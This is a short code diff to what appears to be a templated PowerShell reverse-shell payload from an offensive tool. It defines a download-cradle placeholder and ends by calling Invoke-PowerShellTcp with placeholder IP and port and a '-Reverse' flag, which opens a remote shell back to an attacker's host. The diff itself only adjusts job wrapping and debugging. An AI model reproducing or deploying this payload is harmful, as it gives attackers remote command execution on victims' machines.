@@ -1,4 +1,6 @@
-Start-Job -ScriptBlock {
+# Start-Job -ScriptBlock {
+
+{{'$DebugPreference = "Continue"'|debug}}
 
 $DL_CRADLE = @'
 {{dl_cradle}}
@@ -113,9 +115,6 @@ function Invoke-PowerShellTcp
         $result | ? { $_.data }
     }
 
-    Retrieve-Errors {
-
-    }
 
     function Handle-Packets {
 
@@ -218,4 +217,4 @@ function Invoke-PowerShellTcp
 
 
 Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse -Delay {{delay}} -LifeTime {{lifetime}}
-}
+# }
